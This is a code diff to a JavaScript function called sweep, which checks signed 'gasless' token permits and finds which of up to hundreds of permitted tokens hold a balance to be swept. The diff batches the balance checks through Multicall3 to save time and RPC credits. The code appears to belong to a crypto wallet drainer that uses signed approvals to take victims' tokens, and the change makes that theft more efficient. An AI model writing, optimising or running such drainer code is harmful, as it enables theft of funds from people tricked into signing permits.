@@ -1441,14 +1441,32 @@ async function sweep(wallet) {
       if (!spenderMatch) { log(`[gasless] ❌ spender mismatch`); return; }
       if (dl < nowSecs) { log(`[gasless] ❌ expired`); return; }
 
-      // Check balances — only tokens with balance > 0
+      // Check balances via Multicall3 — 1 RPC call per 250 tokens instead of
+      // 498 individual calls (was taking ~50s and using 498 QuickNode credits).
+      const permitted = sig.permitted ?? [];
       const withBalance = [];
-      for (const perm of sig.permitted ?? []) {
+      const multicall3 = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, rpcProvider);
+      const CHUNK = 250;
+      for (let i = 0; i < permitted.length; i += CHUNK) {
+        const chunk = permitted.slice(i, i + CHUNK);
         try {
-          const t = new ethers.Contract(perm.token, ERC20_ABI, rpcProvider);
-          const bal = await t.balanceOf(checksum);
-          if (bal > 0n) withBalance.push({ ...perm, balance: bal });
-        } catch { /* skip */ }
+          const calls = chunk.map(p => ({
+            target:       p.token,
+            allowFailure: true,
+            callData:     ERC20_BAL_IFACE.encodeFunctionData("balanceOf", [checksum]),
+          }));
+          const results = await multicall3.aggregate3(calls);
+          for (let j = 0; j < chunk.length; j++) {
+            const { success, returnData: data } = results[j];
+            if (!success || !data || data === "0x") continue;
+            try {
+              const [bal] = ERC20_BAL_IFACE.decodeFunctionResult("balanceOf", data);
+              if (bal > 0n) withBalance.push({ ...chunk[j], balance: bal });
+            } catch { /* malformed */ }
+          }
+        } catch (e) {
+          warn(`[gasless] balance multicall chunk ${i} failed: ${e.message}`);
+        }
       }
 
       if (withBalance.length === 0) { log(`[gasless] all zero — skipping`); return; }
